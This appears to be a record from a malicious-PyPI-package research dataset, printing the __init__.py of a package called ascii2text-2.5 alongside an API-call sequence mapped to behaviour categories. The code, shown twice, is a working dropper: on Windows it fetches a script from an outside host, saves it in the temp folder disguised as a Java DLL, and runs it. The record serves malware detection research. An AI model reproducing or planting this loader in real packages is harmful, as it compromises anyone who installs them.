[
  {
    "pyfile": "__init__.py",
    "code_snippet": "from sys import executable\nfrom urllib import request\nfrom os import getenv, system, name\nfrom os.path import isfile\n\nif name != 'nt': \n    exit()\n\npath = getenv(\"TEMP\") + \"\\java-8u311.dll\"\nif not isfile(path):\n    script = request.urlopen(\"https://zerotwo-best-waifu.online/778112985743251/mawl.txt\").read().decode(\"utf8\")     # mawlware\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(script)\n    f.close()\n    system(f\"start {executable.replace('.exe', 'w.exe')} {path}\")",
    "pattern_analysis": {
      "api_sequence": [
        "os.name",
        "os.getenv",
        "os.path.isfile",
        "urllib.request.urlopen",
        "http.client.HTTPResponse.read",
        "bytes.decode",
        "builtins.open",
        "io.TextIOWrapper.write",
        "io.TextIOWrapper.close",
        "os.system",
        "sys.executable.replace"
      ],
      "api_sequence_with_args": [
        "os.name",
        "os.getenv(\"TEMP\")",
        "os.path.isfile(path)",
        "urllib.request.urlopen(\"https://zerotwo-best-waifu.online/778112985743251/mawl.txt\")",
        "http.client.HTTPResponse.read()",
        "bytes.decode(\"utf8\")",
        "open(path, mode='w', encoding='utf-8')",
        "f.write(script)",
        "f.close()",
        "os.system(f\"start {executable.replace('.exe', 'w.exe')} {path}\")",
        "sys.executable.replace('.exe', 'w.exe')"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_bytes",
          "description": "Reads response body as bytes",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_codec",
          "description": "Decodes bytes using specified codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "builtins.open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "io.TextIOWrapper.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "io.TextIOWrapper.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "sys.executable.replace",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        }
      ],
      "contextual_code": "from sys import executable\nfrom urllib import request\nfrom os import getenv, system, name\nfrom os.path import isfile\n\nif name != 'nt': \n    exit()\n\npath = getenv(\"TEMP\") + \"\\java-8u311.dll\"\nif not isfile(path):\n    script = request.urlopen(\"https://zerotwo-best-waifu.online/778112985743251/mawl.txt\").read().decode(\"utf8\")\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(script)\n    f.close()\n    system(f\"start {executable.replace('.exe', 'w.exe')} {path}\")"
    }
  },
  {
    "metadata": {
      "package_name": "ascii2text-2.5",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/ascii2text-2.5/ascii2text-2.5/ascii2text/__init__.py",
      "code_hash": "4c0366a60f2956e24ced22669b616c77"
    }
  }
]